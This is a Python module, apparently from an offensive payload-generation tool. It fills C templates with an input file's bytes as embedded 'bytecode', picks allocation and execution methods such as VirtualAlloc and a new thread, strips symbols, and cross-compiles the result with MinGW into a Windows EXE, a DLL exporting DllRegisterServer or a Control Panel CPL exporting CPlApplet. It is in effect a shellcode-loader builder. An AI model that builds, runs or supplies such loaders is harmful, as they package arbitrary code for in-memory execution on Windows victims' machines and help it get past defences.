import os
import subprocess
import sys
import uuid
import importlib
from jinja2 import Environment, FileSystemLoader

def _build_compiler_command(options, temp_c_filename, temp_def_filename, output_artifact_filename):
    """A helper function to build the GCC compiler command list."""
    command = ["x86_64-w64-mingw32-gcc", "-O2"]

    if options.get('debug_mode') != 'true':
        command.append("-s")

    output_format = options.get('output_format', 'exe')
    if output_format in ['dll', 'cpl']:
        command.extend(["-shared", "-fvisibility=hidden", "-lkernel32"])
        if output_format == 'cpl':
            command.append("-lshell32")
        if temp_def_filename:
            command.append(temp_def_filename)

    command.extend([temp_c_filename, "-o", output_artifact_filename])
    
    return command

def encode(input_filepath, original_filename, options):
    """
    Dynamically generates and compiles a C program, handling different data sources.
    """
    print(f"INFO: Starting Windows C embedder with options: {options}")
    
    temp_files_to_clean = []
    try:
        data_source_choice = options.get('data_source', 'embedded')
        template_vars = {
            'data_source_partial': f"partials/datasource_{data_source_choice}.c.j2"
        }

        if data_source_choice == 'file':
            file_path = options.get('file_path', '').replace('\\', '\\\\')
            template_vars['file_path'] = file_path
            template_vars['bytecode_array'] = ""
        else: # The payload is embedded...
            with open(input_filepath, "rb") as f:
                bytecode_to_embed = f.read()
            template_vars['bytecode_array'] = ", ".join([f"0x{byte:02x}" for byte in bytecode_to_embed])

        template_dir = os.path.join(os.path.dirname(__file__), 'templates')
        env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
        template = env.get_template('base.c.j2')

        output_format = options.get('output_format', 'exe')
        export_name = 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer')
        
        template_vars.update({
            'data_source': data_source_choice,
            'allocation_partial': f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
            'execution_partial': f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
            'output_format': output_format,
            'export_name': export_name,
            'debug_mode': (options.get('debug_mode') == 'true'),
            'bytecode_transformation': options.get('bytecode_encoding'),
            'bytecode_compression': options.get('bytecode_compression')
        })

        c_source_code = template.render(**template_vars)

        temp_c_filename = f"{uuid.uuid4()}.c"
        temp_c_filepath = os.path.join('/tmp/uploads', temp_c_filename)
        temp_files_to_clean.append(temp_c_filepath)
        with open(temp_c_filepath, "w") as f:
            f.write(c_source_code)

        temp_def_filename = None
        if output_format in ['dll', 'cpl']:
            def_content = f"EXPORTS\n    {export_name}"
            temp_def_filename = f"{uuid.uuid4()}.def"
            temp_def_filepath = os.path.join('/tmp/uploads', temp_def_filename)
            temp_files_to_clean.append(temp_def_filepath)
            with open(temp_def_filepath, "w") as f_def:
                f_def.write(def_content)

        base_name, _ = os.path.splitext(original_filename)
        output_artifact_filename = f"{base_name}.{output_format}"
        
        compiler_command = _build_compiler_command(
            options, temp_c_filename, temp_def_filename, output_artifact_filename
        )

        print(f"INFO: Compiling with command: {' '.join(compiler_command)}")
        subprocess.run(
            compiler_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads'
        )
        print(f"INFO: Compilation successful. Artifact: {output_artifact_filename}")

        return output_artifact_filename

    except subprocess.CalledProcessError as e:
        print(f"ERROR: Compilation failed. Stderr: {e.stderr}", file=sys.stderr)
        raise Exception(f"C compilation failed: {e.stderr}")
    finally:
        for f_path in temp_files_to_clean:
            if os.path.exists(f_path):
                os.remove(f_path)
